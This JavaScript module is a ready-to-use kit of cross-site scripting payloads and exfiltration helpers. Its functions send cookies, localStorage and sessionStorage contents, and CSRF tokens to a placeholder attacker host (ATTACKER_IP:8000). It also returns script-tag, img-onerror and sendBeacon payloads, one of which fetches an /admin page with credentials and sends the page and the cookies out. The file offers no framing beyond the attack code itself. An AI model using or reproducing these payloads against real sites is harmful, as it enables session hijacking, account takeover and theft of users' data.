const ATTACKER_HOST = "http://ATTACKER_IP:8000";

function getCookies() {
  return document.cookie;
}

function exfilCookie() {
  fetch(`${ATTACKER_HOST}/steal?c=${encodeURIComponent(document.cookie)}`);
}

function exfilStorage() {
  const dump = {
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
  };
  fetch(`${ATTACKER_HOST}/steal?data=${encodeURIComponent(JSON.stringify(dump))}`);
}

function exfilCsrfToken() {
  const token =
    document.querySelector('input[name="csrf_token"]')?.value ||
    document.querySelector('meta[name="csrf-token"]')?.content;
  fetch(`${ATTACKER_HOST}/steal?csrf=${encodeURIComponent(token || "")}`);
}

function xssPayloadStealCookie() {
  return `<script>fetch("${ATTACKER_HOST}/steal?c="+encodeURIComponent(document.cookie))</script>`;
}

function xssPayloadStealCookieNoScript() {
  return `<img src=x onerror="fetch('${ATTACKER_HOST}/steal?c='+encodeURIComponent(document.cookie))">`;
}

function xssPayloadBeacon() {
  return `<script>navigator.sendBeacon("${ATTACKER_HOST}/steal", document.cookie)</script>`;
}

function xssPayloadFetchAdminAndExfilCookie() {
  return `<script>fetch("/admin",{credentials:"include"}).then(r=>r.text()).then(t=>fetch("${ATTACKER_HOST}/steal?admin="+encodeURIComponent(t)+"&cookie="+encodeURIComponent(document.cookie)))</script>`;
}

module.exports = {
  getCookies,
  exfilCookie,
  exfilStorage,
  exfilCsrfToken,
  xssPayloadStealCookie,
  xssPayloadStealCookieNoScript,
  xssPayloadBeacon,
  xssPayloadFetchAdminAndExfilCookie,
};